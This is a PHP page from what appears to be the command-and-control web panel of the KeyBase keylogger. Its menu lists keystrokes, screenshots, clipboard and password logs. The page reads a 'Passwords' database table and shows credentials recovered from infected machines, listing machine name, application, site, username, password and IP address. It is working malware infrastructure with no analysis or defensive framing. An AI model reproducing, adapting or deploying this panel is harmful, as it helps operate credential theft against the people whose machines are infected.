﻿<?php
ob_start();
session_start();
if (!isset($_SESSION['logged_in']) 
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>KeyBase Web Panel</title>
	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
     <!-- MORRIS CHART STYLES-->
   
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
     <!-- TABLE STYLES-->
    <link href="assets/js/dataTables/dataTables.bootstrap.css" rel="stylesheet" />
</head>
<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="index.php">KeyBase </a> 
            </div>
  <div style="color: white;
padding: 15px 50px 5px 50px;
float: right;
font-size: 16px;"> <a href="login.php" class="btn btn-danger square-btn-adjust">Logout</a> </div>
        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                    <li>
                        <a  href="index.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard</a>
                    </li>
                   <li>
                        <a  href="keystrokes.php"><i class="fa fa-desktop fa-3x"></i> Keystrokes</a>
                    </li>
                    <li>
                        <a  href="screenshots.php"><i class="fa fa-qrcode fa-3x"></i> Screenshots</a>
                    </li>
						   <li  >
                        <a  href="clipboard.php"><i class="fa fa-bar-chart-o fa-3x"></i> Clipboard</a>
                    </li>	
                      <li  >
                        <a class="active-menu"  href="passwords.php"><i class="fa fa-table fa-3x"></i>Passwords</a></li>
                    
                       	<li  >
                        <a  href="delete.php"><i class="fa fa-qrcode fa-3x"></i> Delete Logs</a>
                    </li>   
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                            
            <div class="row">
                <div class="col-md-12">
                    <!-- Advanced Tables -->
                    <div class="panel panel-default">
                        <div class="panel-heading">
                             Passwords recovered
                        </div>
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover" id="Passwords">
                                    
<?php
include ('config.php');
$table = "Passwords";

$conn = mysqli_connect($mysql_host, $mysql_user, $mysql_password, $mysql_database);

echo '
<thead>
<tr bgcolor="#3399FF">
';
echo '

<th>Machine Name</th>
<th>Application</th>
<th>Webpage Link</th>
<th>Username</th>
<th>Password</th>
<th>IP Address</th>
<th>Date</th>

</tr>
</thead>
<tbody>
';
$query  = "select * from $table";
$result = mysqli_query($conn, $query);
 
while ( $row = mysqli_fetch_assoc($result) )
{
    unset($row['id']);
    echo "<tr>";
    foreach ($row as $key => $value)
    {
        echo "<td>$value</td>";
    }
    echo "</tr>";
}
 
echo '
</tbody>
</table>
</body>
</html>
';
?>					
				</table>
                            </div>
                            
                        </div>
                    </div>
                    <!--End Advanced Tables -->
                </div>
            </div>
               
                
                </div>
            </div>
                
               
    </div>
             <!-- /. PAGE INNER  -->
            </div>
         <!-- /. PAGE WRAPPER  -->
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
     <!-- DATA TABLE SCRIPTS -->
    <script src="assets/js/dataTables/jquery.dataTables.js"></script>
    <script src="assets/js/dataTables/dataTables.bootstrap.js"></script>
        <script>
            $(document).ready(function () {
                $('#Passwords').dataTable();
            });
	$('#Passwords').click( function() {
    	var anSelected = fnGetSelected( oTable );
    	$(anSelected).remove();
} );
    </script>
         <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
    
   
</body>
</html>